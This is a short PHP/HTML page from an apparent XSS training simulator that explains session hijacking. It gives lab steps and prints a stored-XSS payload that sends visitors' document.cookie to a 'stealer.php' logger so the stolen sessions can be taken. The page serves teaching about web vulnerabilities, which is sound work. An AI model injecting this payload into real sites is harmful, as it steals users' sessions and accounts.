<!DOCTYPE html>
<html>
<head>
	<title>XSS Session Hijacking</title>
	<link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
</head>
<body style="background-color: #E5E5E5">
	<?php include 'navbar.php' ?> <br>

	<center>
		<h1>XSS Session Hijacking</h1><br>
		<p>This XSS simulator is designed to show the dangerous effects that XSS session hijacking attacks - and XSS <br>vulnerability in general - can make to your website if it is vulnerable to it.</p>
	</center>

	<h3>How it works</h3>
	<ul>
		<li>Register two accounts and login using different browsers (in order to keep the session).</li>
		<li>Go to the blog using one account and enter this code: 
			<?php $code = '<script>location.href=\'stealer.php?cookie=\'+document.cookie</script>'; echo htmlspecialchars($code); ?> 
			.. This code will redirect any user enters the blog to the page 'stealer.php' which wil accept the parameter 'cookie' containing the cookies of the user and writes it in the file 'logs.txt'.</li>
		<li>Go to the blog from the other account, you will be redirected.</li>
		<li>Go to the logs.txt file and take your stealed cookie.</li>
	</ul>

</body>
</html>